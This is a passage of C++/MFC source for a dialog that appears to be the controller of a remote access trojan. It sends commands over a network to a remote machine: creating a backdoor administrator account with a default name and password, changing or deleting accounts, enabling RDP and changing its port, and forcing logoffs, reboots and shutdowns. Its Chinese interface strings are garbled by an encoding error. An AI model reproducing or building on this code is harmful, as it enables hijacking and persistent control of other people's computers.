	m_list.InsertColumn(4, "Զ������IP", LVCFMT_LEFT, 150);
	
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	
	char	*strUserName; 
	char	*strSessionId;  
	char	*strClientAddress;  
	char	*strWinStationName; 
	char	*ConnectionState; 
	
	DWORD	dwOffset = 0;
	CString str;
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		strUserName = lpBuffer + dwOffset;
		m_list.InsertItem(i, strUserName);
		dwOffset += lstrlen(strUserName)+1;
		
		strSessionId = lpBuffer + dwOffset;
		str.Format("%d",atoi(strSessionId));
		m_list.SetItemText(i, 1, str);
		dwOffset += lstrlen(strSessionId)+1;
		
		strClientAddress = lpBuffer + dwOffset;
		m_list.SetItemText(i, 4, strClientAddress);
		dwOffset += lstrlen(strClientAddress)+1;
		
		strWinStationName = lpBuffer + dwOffset;
		m_list.SetItemText(i, 3, strWinStationName);
		dwOffset += lstrlen(strWinStationName)+1;
		
		ConnectionState = lpBuffer + dwOffset;
		m_list.SetItemText(i, 2, ConnectionState);
		dwOffset += lstrlen(ConnectionState)+1;
		
	}
}

void CSystemDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if (nIDEvent == 1)
	{
		CString str;

		str.Format("������: %d",dwPrs);
		m_wndStatusBar.SetPaneText(0, str); 

		str.Format("CPU ʹ����: %d%%",dwCpu);
		m_wndStatusBar.SetPaneText(1, str); 

		str.Format("�����ڴ�: %d%%",dwMem);
		m_wndStatusBar.SetPaneText(2, str); 
	}

	CDialog::OnTimer(nIDEvent);
}

void CSystemDlg::OnCancel() 
{
	// TODO: Add extra cleanup here
	OnClose();
	CDialog::OnCancel();
}

void CSystemDlg::OnChangeUserState(UINT uState)
{
	POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if  (pos  ==  NULL)
	{
		if (uState == COMMAND_DISCONNECTUSER)
			::MessageBox(m_hWnd,_T("����ѡ��Ҫ�Ͽ����û�!"),"��ʾ",MB_YESNO);
		else
			::MessageBox(m_hWnd,_T("����ѡ��Ҫע�����û�!"),"��ʾ",MB_YESNO);
		
		return;
	}
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (m_list.GetSelectedCount() * 4));
	lpBuffer[0] = uState; 
	
	DWORD	dwOffset = 1;
	int	nItem=0;
	
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		nItem = m_list.GetNextSelectedItem(pos);
		DWORD dwProcessID = m_list.GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	CString str,strCaption;
	char *lpTips = _T("����: �Ͽ��û��ᵼ�²�ϣ�������Ľ����\n");
	if (uState == COMMAND_LOGOFF_USER)
	{
		strCaption = "ע���û�����";
		lpTips = _T("����: ע���û��ᵼ�²�ϣ�������Ľ����\n");
		str.Format(_T("%sȷʵ ��ע��  %s �û���?"), lpTips, m_list.GetItemText(nItem,0));
	}
	else
	{
		strCaption = "�Ͽ��û�����";
		str.Format(_T("%sȷʵ ��Ͽ�  %s �û���?"), lpTips, m_list.GetItemText(nItem,0));
	}

	if (::MessageBox(m_hWnd, str, strCaption, MB_YESNO|MB_ICONQUESTION) == IDNO)
	{
		LocalFree(lpBuffer);
		return;
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnChangeUser(UINT uState)
{
	POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	CString Data;
	CString Name;
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = uState;
	dwOffset = 1;
	
	if  (pos  ==  NULL)
	{
		return;
	}
	else
	{
		while(pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			Name = m_list.GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSystemDlg::OnMenuitemActiveUser() 
{
	// TODO: Add your command handler code here
	OnChangeUser(COMMAND_ACITVEUSER);

}

void CSystemDlg::OnMenuitemDisableUser() 
{
	// TODO: Add your command handler code here
	OnChangeUser(COMMAND_DISABLEEUSER);

}

void CSystemDlg::OnMenuitemAddUser() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("��NET����û�"), _T("��ʽ���û���|����|�û���"), this,TRUE,"IIS_USER|Smile2016|Administrators");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	
	CString Username, Password, Administrators;
	
    AfxExtractSubString(Username,dlg.m_str.GetBuffer(0),0,'|'); 
    AfxExtractSubString(Password,dlg.m_str.GetBuffer(0),1,'|'); 
	AfxExtractSubString(Administrators,dlg.m_str.GetBuffer(0),2,'|');
	
	
	if (Username.IsEmpty()|| Password.IsEmpty()||Administrators.IsEmpty())
	{
		::MessageBox(m_hWnd,"�������Ϣ���Ϸ�", "����",NULL);
		return;
	}
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_NET_USER;
	dwOffset = 1;
	
	memcpy(lpBuffer + dwOffset, Username.GetBuffer(0), (Username.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Username.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, Password.GetBuffer(0), (Password.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Password.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, Administrators.GetBuffer(0), (Administrators.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Administrators.GetLength() + 1)*sizeof(TCHAR);
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSystemDlg::OnMenuitemChangePass() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if  (pos  ==  NULL)
	{
		::MessageBox(m_hWnd,_T("����ѡ��Ҫ�޸�������û�!"),"��ʾ",MB_YESNO);
		
		return;
	}
	
	CInputDialog	dlg;
	dlg.Init(_T("�޸�����"), _T("������Ҫ�޸ĵ�����:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	
	CString Data;
	CString Name;
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_CHANGE_USERPASS;
	dwOffset = 1;
	
	
	
	while(pos)
	{
		int	nItem = m_list.GetNextSelectedItem(pos);
		Name = m_list.GetItemText(nItem, 0);
		Data += Name;
		Data += _T("\r\n");
	}
	Data = Data.Left(Data.GetLength() - 2);
	memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, dlg.m_str.GetBuffer(0), (dlg.m_str.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (dlg.m_str.GetLength() + 1)*sizeof(TCHAR);
	
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSystemDlg::OnMenuitemDelUser() 
{
	// TODO: Add your command handler code here
	OnChangeUser(COMMAND_DELUSER);

}

void CSystemDlg::OnMenuitemDisconnectUser() 
{
	// TODO: Add your command handler code here
	OnChangeUserState(COMMAND_DISCONNECTUSER);

}

void CSystemDlg::OnMenuitemLogoffUser() 
{
	// TODO: Add your command handler code here
	OnChangeUserState(COMMAND_LOGOFF_USER);

}

void CSystemDlg::OnButtonMstsc() 
{
	// TODO: Add your control notification handler code here
	TCHAR szMSTSC[MAX_PATH], szMsg[MAX_PATH];
	GetModuleFileName(NULL, szMSTSC, sizeof(szMSTSC));
	*_tcsrchr( szMSTSC, '\\' ) = '\0';
	lstrcat(szMSTSC, _T("\\Tools\\mstsc.exe"));
	if (GetFileAttributes(szMSTSC) == INVALID_FILE_ATTRIBUTES)
	{
		wsprintf(szMsg, _T("�����ļ� %s��ʧ!\n�޷���������!"), szMSTSC);
		MessageBox(szMsg, _T("����!"), MB_ICONWARNING | MB_OK);
		return;
	}

	CString str;
	str.Format("%s:%d",IPAddress,nRemotePort);

	CInputDialog	dlg;
	dlg.Init(_T("Զ����������"), _T("��ʽ��IP:�˿�"), this,TRUE,str);
	if (dlg.DoModal() != IDOK)   
		return;


/*	if (((CButton*)GetDlgItem(IDC_CHECK_CONSOLE))->GetCheck())*/
		wsprintf(szMsg, _T("/console /v:%s"), dlg.m_str.GetBuffer(0));
/*
	else
		wsprintf(szMsg, _T("/v:%s:"), dlg.m_str.GetBuffer(0));*/

	ShellExecute(NULL, _T("open"), szMSTSC, szMsg, NULL, SW_SHOWNORMAL);
}

void CSystemDlg::OnButtonChanageport() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strPort;
	GetDlgItemText(IDC_EDIT_PORT, strPort);
	int nPacketLength = 1 + strPort.GetLength() * 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_3389_PORT;
	memcpy(lpPacket + 1, strPort.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete []lpPacket;
	::MessageBox(m_hWnd,_T("�����Ѿ�����\r\n�������Ժ���Ч!"),_T("��ʾ"),NULL);
}

void CSystemDlg::OnButtonOpen3389() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_OPEN_3389;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}

void CSystemDlg::OnMenuitemSLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_S_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}

void CSystemDlg::OnMenuitemSReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_S_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}

void CSystemDlg::OnMenuitemSShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_S_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}

BOOL CSystemDlg::DestroyWindow() 
{
	// TODO: Add your specialized code here and/or call the base class
	KillTimer(1);

	return CDialog::DestroyWindow();
}
